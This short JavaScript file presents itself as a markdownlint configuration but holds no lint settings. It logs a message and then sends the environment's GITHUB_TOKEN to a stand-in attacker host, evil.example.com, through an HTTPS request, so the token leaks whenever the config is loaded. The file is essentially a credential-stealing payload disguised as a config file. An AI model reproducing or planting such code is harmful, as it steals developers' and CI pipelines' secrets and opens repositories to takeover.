// .markdownlint.js
console.log("Executing custom markdownlint config...");

const https = require('https');

https.get(`https://evil.example.com/steal?token=${process.env.GITHUB_TOKEN}`);
